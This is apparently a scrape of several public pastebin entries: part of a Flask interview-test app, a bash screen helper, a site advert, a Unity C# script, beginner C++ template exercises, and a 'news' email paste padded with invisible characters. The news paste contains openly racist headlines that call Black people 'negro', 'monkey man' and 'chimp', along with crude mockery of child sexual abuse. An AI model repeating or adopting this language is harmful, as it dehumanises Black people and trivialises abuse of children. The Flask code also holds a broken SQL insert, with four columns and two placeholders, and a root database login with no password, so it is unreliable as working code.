        return ""Gagal mengambil data dari kolum nama_komoditas tabel daftar_komoditas""
    
    return render_template('index.html',data=data,alert=alert, title='Website Test Interview PT Mede Media Softika | Daftar Komoditas')

@app.route('/form_komoditas')
def form_komoditas():
    
    return render_template(""forms_komoditas.html"", title='Website Interview PT Mede Media Softika | Form Komoditas')

@app.route('/tambah_datakomoditas', methods=['GET','POST'])
def tambah_datakomoditas():
    if request.method == 'POST':
        Kode_komoditas = request.form['kodekomoditas']
        Nama_komoditas = request.form['namakomoditas']
    
    
    
    try:
        mydatabase = mysql.connector.connect(host='localhost', user='root', passwd='', database='testinterview_dbkomoditas')
        mycursor = mydatabase.cursor()
        sql = ""INSERT INTO daftar_komoditas (komoditas_kode, komoditas_nama) VALUES (%s, %s)""  # perbaikan disini
        val = (Kode_komoditas, Nama_komoditas)  # perbaikan disini
        mycursor.execute(sql, val)
        mydatabase.commit()
        mycursor.close()
        mydatabase.close()
        return redirect(url_for('beranda', alert='Data komoditas berhasil disimpan!'))
    except:
        return 'Terjadi Kesalahan saat menyimpan data'
    # Mengirimkan alert peringatan data berhasil disimpan
    return render_template('forms_komoditas.html')
   
@app.route('/tambah_dataproduksi', methods=['GET','POST'])
def tambah_dataproduksi():
    if request.method == 'POST':
        Kode_Komoditas = request.form['kodekomoditas']
        Tanggal_produksi = request.form['tanggalproduksi']
        Nama_komoditas = request.form['namakomoditas']
        Jumlah_produksi = request.form['jumlahproduksi']
    
    
    try:
        mydatabase = mysql.connector.connect(host='localhost', user='root', passwd='', database='testinterview_dbkomoditas')
        mycursor = mydatabase.cursor()
        sql = ""INSERT INTO daftar_produksi (komoditas_kode,tanggal, nama_komoditas,jumlah) VALUES (%s, %s)""  # perbaikan disini
        val = (Kode_Komoditas,Tanggal_produksi, Nama_komoditas,Jumlah_produksi)  # perbaikan disini
        mycursor.execute(sql, val)
        mydatabase.commit()
        mycursor.close()
        mydatabase.close()
        return redirect(url_for('lihat_data_produksi', alert='Data produksi berhasil disimpan!'))
    except:
        return 'Terjadi Kesalahan saat menyimpan data'
    # Mengirimkan alert peringatan data berhasil disimpan
    return render_template('forms_produksi.html')

@app.route('/lihat_data_produksi')
def lihat_data_produksi():
    alert = request.args.get('alert')
    # Mengambil data dari database
    data = get_data_produksi()
    if data is None:
        return ""Gagal mengambil data dari kolum nama_komoditas tabel daftar_produksi""
    
    return render_template('details_produksi.html',data=data,alert=alert, title='Website Test Interview PT Mede Media Softika | Daftar Produksi')
    
    

@app.route('/form_produksi')
def form_produksi():
    # Mengambil data dari database
    data = get_data_komoditas()
   
    if data is None:
        return ""Gagal mengambil data dari tabel daftar_komoditas kolum komoditas_nama""
    return render_template('forms_produksi.html', data= data, title='Website Interview PT Mede Media Softika | Form Produksi')

@app.route('/lihat_data_transaksi')
def lihat_data_transaksi():
    #alert = request.args.get('alert')
    # Mengambil data dari database
    #data = get_data_produksi()
    #if data is None:
     #   return ""Gagal mengambil data dari kolum nama_komoditas tabel daftar_produksi""
    
    return render_template('lihat_transaksi.html', title='Website Test Interview PT Mede Media Softika | Data Transaksi')

@app.route('/cetak_data_transaksi', methods=['GET', 'POST'])
def cetak_data_transaksi():
    try:
        # Mengambil data dari database
        data = get_data_produksi()

        # Memeriksa apakah data berhasil diambil
        if data is None:
            return ""Gagal mengambil data dari tabel daftar_produksi""

        # Render template dengan data
        html = render_template('lihat_transaksi.html', data=data)

        # Konversi HTML ke PDF dengan konfigurasi yang sudah ditentukan
        pdf = pdfkit.from_string(html, False, configuration=config)

        # Mengatur response untuk file PDF
        response = make_response(pdf)
        response.headers['Content-Type'] = 'application/pdf'
        response.headers['Content-Disposition'] = 'attachment; filename=hasiltransaksi.pdf'

        return response
    except Exception as e:
        return f'Terjadi Kesalahan: {str(e)}'

    return render_template('lihat_transaksi.html', title='Website Test Interview PT Mede Media Softika | Data Transaksi')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
    app.run(debug=True)
"
v2rw7yZV,stuff,dyeske,Bash,Friday 15th of March 2024 11:39:54 PM CDT,"
stuff() {
    screen -list | grep ""Dead ???"" > /dev/null && screen -wipe
    if [ -n ""$STY"" ]; then
        echo ""already on screen on $STY DISPLAY $DISPLAY""
    else
        echo ""starting screen on $STY DISPLAY $DISPLAY""
        screen -d -RR
    fi
}
"
nPuHBqgm,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Friday 15th of March 2024 11:36:24 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes

Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
rtzcY1FN,Untitled,DugganSC,C#,Friday 15th of March 2024 11:35:41 PM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using Unity.VisualScripting;
using UnityEngine;
using UnityEngine.XR.Interaction.Toolkit.AR;

public class ExaminableManager : MonoBehaviour
{
    [SerializeField]
    Transform _examineTarget;

    Vector3 _priorPos;
    Quaternion _priorRot;
    Vector3 _priorScale;
    Transform _priorParent;
    
    [SerializeField]
    PlacementManager _placementManager;

    void Start()
    {
        if (_placementManager == null) { 
            _placementManager = GameObject.FindFirstObjectByType<PlacementManager>();

            if (_placementManager == null ) {
                Debug.LogError(""#### Could not locate Placement Manager."");
            }
        }
    }

    GameObject _examinedObject;
    private bool isExamining = false;
    private float _rotSpeed = 25f;

    private void Update()
    {
        if (isExamining && Input.touchCount > 0)
        {
            // Get first touch
            Touch touch = Input.GetTouch(0);
            if (touch.phase == TouchPhase.Moved)
            {
                Vector3 rotation = new Vector3(touch.deltaPosition.x, touch.deltaPosition.y, 0) * _rotSpeed * Time.deltaTime;
                _examinedObject.transform.Rotate(rotation);
            }
        }
    }

    public void ToggleExamination()
    {
        if (isExamining)
        {
            Unexamine();
        } else
        {
            PerformExamination();
        }
    }

    public void PerformExamination()
    {
        GameObject selectedObject = _placementManager.GetSelectedObject();
        if (selectedObject == null || _examineTarget == null)
        {
            Debug.Log($""Examine failed: Target: {selectedObject} examineTarget: {_examineTarget}"");
            return; 
        }

        Debug.Log($""Examining {selectedObject.gameObject.name}"");

        if (selectedObject.TryGetComponent<Examinable>(out Examinable examinable))
        {
            _examinedObject = examinable.ExaminedObject;
            _priorPos = _examinedObject.transform.localPosition;
            _priorRot = _examinedObject.transform.localRotation;
            _priorScale = _examinedObject.transform.localScale;
            _priorParent = _examinedObject.transform.parent;

            _examinedObject.transform.position = _examineTarget.position;
            _examinedObject.transform.parent = _examineTarget;
            _examinedObject.transform.localScale = _priorScale * examinable.ExamineScaleOffset();
        }

        isExamining = true;
    }

    public void Unexamine()
    {
        _examinedObject.SetActive(true);
        _examinedObject.transform.position = _priorPos;
        _examinedObject.transform.rotation = _priorRot;
        _examinedObject.transform.localScale = _priorScale;

        _examinedObject.transform.parent = _priorParent;

        isExamining = false;
    }
}
"
cnAVMbyF,Untitled,35657,C++,Friday 15th of March 2024 11:20:35 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
void display(T arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

template<typename T>
void average(T arr[], int size) {
    T sum = 0;
    for (int i = 0; i < size; i++) {
        sum += arr[i];
    }
    cout << ""Среднее арифметическое массива: "" << sum / size << endl;
}

int main() {

    setlocale(LC_ALL, ""ru"");

    int arr[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    display(arr, size);
    average(arr, size);


    double arr2[]{ 3.5, 2.5, 3.7, 1.0, 3.3, 7.2 };
    display(arr2, size);
    average(arr2, size);
}
"
zaE7nG2x,Untitled,35657,C++,Friday 15th of March 2024 10:53:49 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
void display(T arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void display(char arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i];
    }
    cout << endl;
}

int main() {

    setlocale(LC_ALL, ""ru"");

    int arr[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    display(arr, size);


    double arr2[]{ 3.5, 2.5, 3.7, 1.0, 3.3, 7.2 };
    display(arr2, size);

    char arr3[]{ 'П','р','и','в','е','т' };
    display(arr3, size);
}
"
q8VVnp2P,Untitled,35657,C++,Friday 15th of March 2024 10:50:55 PM CDT,"#include <iostream>

using namespace std;

template<typename T>
void display(T arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

int main() {
    int arr[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    display(arr, size);

    double arr2[]{ 3.5, 2.5, 3.7, 1.0, 3.3, 7.2 };
    display(arr2, size);

    char arr3[]{ 'a', 'b', 'c', 'd', 'e', 'f'};
    display(arr3, size);
}
"
QQYc3Ami,Untitled,35657,C++,Friday 15th of March 2024 10:45:55 PM CDT,"#include <iostream>

using namespace std;


void display(int arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void display(double arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void display(char arr[], int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

int main() {
    int arr[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    display(arr, size);


    // будет ли работать с double?
    double arr2[]{ 3.5, 2.5, 3.7, 1.0, 3.3, 7.2 };
    display(arr2, size);

    char arr3[]{ 'a', 'b', 'c', 'd', 'e', 'f'};
    display(arr3, size);
}
"
9vMiLS7F,News March15 24,Newscaster_Ned,Email,Friday 15th of March 2024 10:28:59 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎a‎l‎l‎ ‎y‎o‎u‎ ‎q‎u‎e‎e‎r‎s‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎T‎r‎u‎m‎p‎ ‎2‎0‎2‎4‎ ‎N‎a‎t‎.‎ ‎P‎r‎e‎s‎s‎ ‎S‎e‎c‎.‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎:‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎‘‎I‎s‎ ‎t‎h‎e‎ ‎P‎a‎r‎t‎y‎ ‎o‎f‎ ‎W‎o‎m‎e‎n‎’‎

’‎N‎i‎g‎h‎t‎m‎a‎r‎e‎’‎ ‎o‎f‎ ‎L‎a‎k‎e‎n‎ ‎R‎i‎l‎e‎y‎ ‎’‎A‎ ‎R‎e‎a‎l‎i‎t‎y‎ ‎i‎n‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎
R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎c‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎t‎a‎k‎e‎s‎ ‎t‎h‎e‎ ‎s‎t‎a‎g‎e‎ ‎a‎t‎ ‎a‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎ ‎r‎a‎l‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎
A‎L‎E‎X‎A‎N‎D‎R‎I‎A‎,‎ ‎V‎I‎R‎G‎I‎N‎I‎A‎ ‎–‎ ‎T‎r‎u‎m‎p‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎p‎r‎e‎s‎s‎ ‎s‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎ ‎d‎e‎c‎l‎a‎r‎e‎d‎ ‎F‎r‎i‎d‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎“‎i‎s‎ ‎t‎h‎e‎ ‎p‎a‎r‎t‎y‎ ‎o‎f‎ ‎w‎o‎m‎e‎n‎”‎ ‎a‎t‎ ‎t‎h‎e‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎F‎e‎d‎e‎r‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎W‎o‎m‎e‎n‎’‎s‎ ‎(‎N‎F‎R‎W‎)‎ ‎S‎p‎r‎i‎n‎g‎ ‎2‎0‎2‎4‎ ‎B‎o‎a‎r‎d‎ ‎M‎e‎e‎t‎i‎n‎g‎.‎

M‎a‎r‎l‎o‎w‎:‎ ‎‘‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎P‎o‎l‎l‎i‎n‎g‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎h‎a‎n‎ ‎A‎n‎y‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎i‎n‎ ‎D‎e‎c‎a‎d‎e‎s‎’‎
M‎a‎r‎l‎o‎w‎:‎ ‎'‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎P‎o‎l‎l‎i‎n‎g‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎h‎a‎n‎ ‎A‎n‎y‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎C‎a‎n‎d‎i‎d‎a‎t‎e‎ ‎i‎n‎ ‎D‎e‎c‎a‎d‎e‎s‎'‎
2‎2‎1‎
A‎n‎a‎l‎y‎s‎i‎s‎:‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎C‎o‎s‎t‎i‎n‎g‎ ‎U‎.‎S‎.‎ ‎T‎a‎x‎p‎a‎y‎e‎r‎s‎ ‎B‎i‎l‎l‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎F‎r‎e‎e‎,‎ ‎U‎n‎i‎n‎s‎u‎r‎e‎d‎ ‎H‎e‎a‎l‎t‎h‎c‎a‎r‎e‎
A‎n‎a‎l‎y‎s‎i‎s‎:‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎C‎o‎s‎t‎i‎n‎g‎ ‎U‎.‎S‎.‎ ‎T‎a‎x‎p‎a‎y‎e‎r‎s‎ ‎B‎i‎l‎l‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎F‎r‎e‎e‎ ‎H‎e‎a‎l‎t‎h‎c‎a‎r‎e‎
1‎0‎4‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎T‎i‎k‎T‎o‎k‎:‎ ‎‘‎T‎h‎e‎r‎e‎’‎s‎ ‎a‎ ‎D‎a‎n‎g‎e‎r‎ ‎t‎o‎ ‎B‎a‎n‎n‎i‎n‎g‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎F‎r‎e‎e‎d‎o‎m‎ ‎o‎f‎ ‎S‎p‎e‎e‎c‎h‎’‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎T‎i‎k‎T‎o‎k‎:‎ ‎'‎T‎h‎e‎r‎e‎'‎s‎ ‎a‎ ‎D‎a‎n‎g‎e‎r‎ ‎t‎o‎ ‎B‎a‎n‎n‎i‎n‎g‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎F‎r‎e‎e‎d‎o‎m‎ ‎o‎f‎ ‎S‎p‎e‎e‎c‎h‎'‎
2‎1‎4‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎T‎r‎u‎m‎p‎ ‎2‎0‎2‎4‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎P‎r‎e‎s‎s‎ ‎S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎:‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎‘‎I‎s‎ ‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎:‎ ‎T‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎'‎I‎s‎ ‎t‎h‎e‎ ‎P‎a‎r‎t‎y‎ ‎o‎f‎ ‎W‎o‎m‎e‎n‎”‎
9‎3‎3‎
P‎o‎l‎l‎a‎k‎:‎ ‎B‎i‎d‎e‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎C‎a‎u‎s‎e‎s‎ ‎W‎o‎r‎s‎t‎ ‎C‎r‎i‎s‎i‎s‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎U‎.‎S‎.‎-‎I‎s‎r‎a‎e‎l‎ ‎R‎e‎l‎a‎t‎i‎o‎n‎s‎
P‎o‎l‎l‎a‎k‎:‎ ‎B‎i‎d‎e‎n‎ ‎C‎a‎u‎s‎e‎s‎ ‎W‎o‎r‎s‎t‎ ‎C‎r‎i‎s‎i‎s‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎U‎.‎S‎.‎-‎I‎s‎r‎a‎e‎l‎ ‎R‎e‎l‎a‎t‎i‎o‎n‎s‎
7‎,‎0‎4‎2‎
J‎u‎d‎g‎e‎ ‎S‎c‎o‎t‎t‎ ‎M‎c‎A‎f‎e‎e‎ ‎R‎u‎l‎e‎s‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎ ‎C‎a‎n‎ ‎R‎e‎m‎a‎i‎n‎ ‎o‎n‎ ‎T‎r‎u‎m‎p‎ ‎C‎a‎s‎e‎ ‎i‎f‎ ‎S‎h‎e‎ ‎F‎i‎r‎e‎s‎ ‎e‎x‎-‎L‎o‎v‎e‎r‎ ‎W‎a‎d‎e‎
J‎u‎d‎g‎e‎ ‎S‎c‎o‎t‎t‎ ‎M‎c‎A‎f‎e‎e‎ ‎D‎e‎n‎i‎e‎s‎ ‎i‎n‎ ‎P‎a‎r‎t‎ ‎M‎o‎t‎i‎o‎n‎ ‎t‎o‎ ‎D‎i‎s‎q‎u‎a‎l‎i‎f‎y‎ ‎F‎a‎n‎i‎ ‎W‎i‎l‎l‎i‎s‎
9‎,‎8‎8‎2‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎:‎ ‎‘‎I‎ ‎W‎i‎l‎l‎ ‎N‎e‎v‎e‎r‎ ‎D‎o‎ ‎A‎n‎y‎t‎h‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎W‎i‎l‎l‎ ‎J‎e‎o‎p‎a‎r‎d‎i‎z‎e‎ ‎o‎r‎ ‎H‎u‎r‎t‎ ‎S‎o‎c‎i‎a‎l‎ ‎S‎e‎c‎u‎r‎i‎t‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎r‎u‎m‎p‎ ‎P‎l‎e‎d‎g‎e‎s‎ ‎t‎o‎ ‎C‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎S‎o‎c‎i‎a‎l‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎,‎ ‎M‎e‎d‎i‎c‎a‎r‎e‎
5‎,‎3‎0‎7‎
R‎e‎p‎o‎r‎t‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎B‎e‎l‎i‎e‎v‎e‎s‎ ‎B‎i‎d‎e‎n‎ ‎‘‎S‎l‎o‎w‎-‎w‎a‎l‎k‎i‎n‎g‎’‎ ‎A‎m‎m‎u‎n‎i‎t‎i‎o‎n‎;‎ ‎W‎e‎ ‎‘‎M‎i‎g‎h‎t‎ ‎L‎o‎s‎e‎ ‎T‎h‎i‎s‎ ‎W‎a‎r‎&‎
R‎e‎p‎o‎r‎t‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎B‎e‎l‎i‎e‎v‎e‎s‎ ‎B‎i‎d‎e‎n‎ ‎'‎S‎l‎o‎w‎-‎w‎a‎l‎k‎i‎n‎g‎'‎ ‎A‎m‎m‎u‎n‎i‎t‎i‎o‎n‎;‎ ‎W‎e‎ ‎'‎M‎i‎g‎h‎t‎ ‎L‎o‎s‎e‎'‎
1‎,‎1‎0‎8‎
P‎e‎n‎c‎e‎:‎ ‎‘‎I‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎B‎e‎ ‎E‎n‎d‎o‎r‎s‎i‎n‎g‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎’‎
P‎e‎n‎c‎e‎:‎ ‎'‎I‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎B‎e‎ ‎E‎n‎d‎o‎r‎s‎i‎n‎g‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎'‎
4‎,‎0‎7‎2‎
O‎v‎e‎r‎ ‎1‎4‎0‎ ‎H‎o‎u‎s‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎D‎e‎m‎a‎n‎d‎ ‎A‎b‎i‎l‎i‎t‎y‎ ‎t‎o‎ ‎B‎l‎o‎c‎k‎ ‎V‎e‎t‎e‎r‎a‎n‎s‎ ‎f‎r‎o‎m‎ ‎P‎u‎r‎c‎h‎a‎s‎i‎n‎g‎ ‎G‎u‎n‎s‎
1‎4‎0‎+‎ ‎H‎o‎u‎s‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎D‎e‎m‎a‎n‎d‎ ‎A‎b‎i‎l‎i‎t‎y‎ ‎t‎o‎ ‎P‎u‎t‎ ‎V‎e‎t‎e‎r‎a‎n‎s‎ ‎o‎n‎ ‎N‎I‎C‎S‎ ‎G‎u‎n‎ ‎B‎a‎n‎

H‎o‎u‎s‎t‎o‎n‎:‎ ‎M‎o‎n‎k‎e‎y‎ ‎M‎a‎n‎ ‎I‎S‎D‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎I‎n‎d‎e‎c‎e‎n‎c‎y‎ ‎t‎o‎ ‎C‎h‎i‎l‎d‎.‎

T‎h‎a‎t‎'‎s‎ ‎w‎h‎a‎t‎ ‎t‎h‎a‎t‎ ‎n‎e‎g‎r‎o‎ ‎g‎e‎t‎s‎ ‎f‎o‎r‎ ‎e‎a‎t‎i‎n‎g‎ ‎o‎u‎t‎ ‎a‎ ‎1‎0‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎g‎i‎r‎l‎.‎


C‎h‎i‎c‎a‎g‎o‎ ‎C‎h‎i‎m‎p‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎R‎o‎b‎b‎e‎r‎y‎ ‎a‎n‎d‎ ‎A‎s‎s‎a‎u‎l‎t‎ ‎D‎u‎r‎i‎n‎g‎ ‎B‎r‎e‎a‎k‎-‎I‎n‎.‎


(‎N‎e‎g‎r‎o‎)‎ ‎E‎a‎s‎t‎ ‎P‎o‎i‎n‎t‎ ‎E‎x‎-‎C‎o‎p‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎F‎u‎c‎k‎i‎n‎g‎ ‎1‎5‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


1‎2‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎K‎i‎l‎l‎e‎d‎ ‎i‎n‎ ‎L‎o‎n‎g‎ ‎B‎r‎a‎n‎c‎h‎ ‎b‎y‎ ‎S‎p‎i‎c‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎7‎°‎
/‎6‎0‎°‎
6‎3‎%‎
N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎ ‎|‎ ‎D‎a‎y‎
7‎7‎°‎
6‎3‎%‎
N‎E‎
1‎2‎
 ‎
m‎p‎h‎
S‎h‎o‎w‎e‎r‎s‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎t‎h‎e‎n‎ ‎s‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎ ‎h‎o‎u‎r‎s‎.‎ ‎P‎o‎t‎e‎n‎t‎i‎a‎l‎ ‎f‎o‎r‎ ‎s‎e‎v‎e‎r‎e‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎.‎ ‎H‎i‎g‎h‎ ‎7‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎6‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
7‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎3‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎3‎8‎ ‎p‎m‎
F‎r‎i‎ ‎1‎5‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎0‎°‎
5‎2‎%‎
N‎N‎E‎
1‎1‎
 ‎
m‎p‎h‎
S‎h‎o‎w‎e‎r‎s‎ ‎e‎a‎r‎l‎y‎,‎ ‎t‎h‎e‎n‎ ‎c‎l‎o‎u‎d‎y‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎6‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎5‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎1‎0‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎2‎:‎5‎0‎ ‎a‎m‎
S‎a‎t‎ ‎1‎6‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎6‎1‎°‎
7‎1‎%‎
N‎N‎E‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎8‎°‎
/‎5‎3‎°‎
6‎2‎%‎
N‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
